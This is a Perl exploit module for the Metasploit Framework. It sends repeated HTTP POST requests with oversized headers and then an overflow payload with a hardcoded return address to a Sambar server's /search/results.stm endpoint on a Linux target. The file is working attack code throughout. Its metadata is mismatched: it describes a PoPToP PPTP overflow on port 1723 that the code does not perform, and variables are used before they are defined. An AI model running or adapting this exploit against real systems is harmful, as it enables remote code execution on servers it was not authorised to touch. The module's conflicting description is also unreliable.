package Msf::Exploit::Sambar6_Search_Results_Linux;
use strict;
use base 'Msf::Exploit';

my $advanced = {
  'RetAddress'  => ['0xbedfdf6c', ''],
};

my $info = {
  'Name'    => 'PoPToP Negative Read Overflow',
  'Version' => '$Revision$',
  'Authors' => [ 'spoonm <ninjatools [at] hush.com>', ],
  'Arch'    => [ 'x86' ],
  'OS'      => [ 'linux' ],
  'Priv'    => 1,
  'UserOpts'  =>
    {
      'RHOST' => [1, 'ADDR', 'The target address'],
      'RPORT' => [1, 'PORT', 'The poptop port', 1723],
    },
  'Payload' =>
    {
      'Space'     => 400, # We need to set this in new, since its user configurable
      'BadChars'  => join('', 'A' .. 'Z'), # Eh, we don't have any
      'PrependEncoder'   => "\x81\xC4\xC0\xFB\xFF\xFF", # add esp,0xfffffbc0 (-1088)
      'MinNops'   => 16,
    },
  'Description'  =>  
        'PoPToP Negative Read Buffer Overflow affecting '.
        'versions prior to 1.1.4-b3 and 1.1.3-20030409. '.
        'The daemon forks, so we can hit as many times as '.
        'we need to. However, you can only hold 4 concurrent '.
        'processes (so 4 concurrent connectbacks and you won\'t hit anyore '.
        'until you free one). It does a fork() and then exec() so '.
        'so the stack should be pretty similar each attempt. '.
        'We can only fit about 200 bytes of shellcode',
  'Refs'  =>
    [
      'http://www.osvdb.org/displayvuln.php?osvdb_id=3293',
      'http://securityfocus.com/archive/1/317995',
      'http://www.freewebs.com/blightninjas/',
    ],
  'Targets' =>
    [
      ['Bruteforce', ''],
    ],
};

sub new {
  my $class = shift;
  my $self = $class->SUPER::new({'Info' => $info, 'Advanced' => $advanced}, @_);
  return($self);
}

sub Exploit {
  my $self = shift;

  my $targetHost  = $self->GetVar('RHOST');
  my $targetPort  = $self->GetVar('RPORT');
  my $targetIndex = $self->GetVar('TARGET');
  my $encodedPayload = $self->GetVar('EncodedPayload');
  my $shellcode   = $encodedPayload->Payload;

  my $leetString = "\x90\x58\x58\xc3" x 750;


  my $postdata;
  my $postlength = length($postdata);
  my $post = "Content-Length: $postlength\r\n\r\n$postdata";

  my $request =
    "POST /search/results.stm HTTP/1.0\r\n".
    "Host: localhost\r\n".
    "User-Agent: Mozilla/4.0 (compatible; MSIE 5.0; Windows NT; DAMSEL)\r\n".
    "Accept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, application/vnd.ms-excel,application/vnd.mspowerpoint, application/msword, application/x-shockwave-flash, */*\r\n".
    "Accept-Language: en-au\r\n".
    "Connection: Keep-Alive\r\n".
    "Pragma: no-cache\r\n".
    "Referer: http://localhost/search/\r\n".
    "SluttyHeader1: " . $leetString ."\r\n".
    "SluttyHeader2: " . $leetString ."\r\n".
    "SluttyHeader3: " . $leetString ."\r\n".
    "SluttyHeader4: " . $leetString ."\r\n".
    "SluttyHeader5: " . $leetString ."\r\n".
    "SluttyHeader6: " . $leetString ."\r\n".
    "Content-Type: application/x-www-form-urlencoded\r\n";


  for(my $i = 0; $i < 20; $i++) {
    my $sock = Msf::Socket->new();
    if(!$sock->tcp($targetHost, $targetPort)) {
      $self->FatalError($sock->get_error);
      return;
    }

    $self->PrintLine("Making coating connection $i.");

    $sock->send($request . $post);
    $sock->close;
#    select(undef, undef, undef, .2); # ghetto sleep
  }
  my $ret = $self->GetLocal('RetAddress');
#  my $postdata = "spage=0&indexname=docs&query=" . "\xc3\x21\xcc\xcc" . getString(38) . pack('l', hex($self->GetLocal('RetAddress'))) . "aaaa" . "&style=page";
  my $postdata = "spage=0&indexname=docs&query=" . getString(39) . pack('L', hex($ret)) . "aaaa" . "&style=page";
  my $postlength = length($postdata);
  my $post = "Content-Length: $postlength\r\n\r\n$postdata";

  my $sock = Msf::Socket->new();
  if(!$sock->tcp($targetHost, $targetPort)) {
    $self->FatalError($sock->get_error);
    return;
  }

  $self->PrintLine("Trying exploit: $ret.");

  $sock->send($request . $post);
  $sock->close;
  sleep(2);
  exit(0);
}

1;

sub getString {
  my $length = shift;
  my $string;
  foreach ('aaaa' .. 'bbbb') {
    last if($length == 0);
    $string .= $_;
    $length--;
  }
  return($string);
}
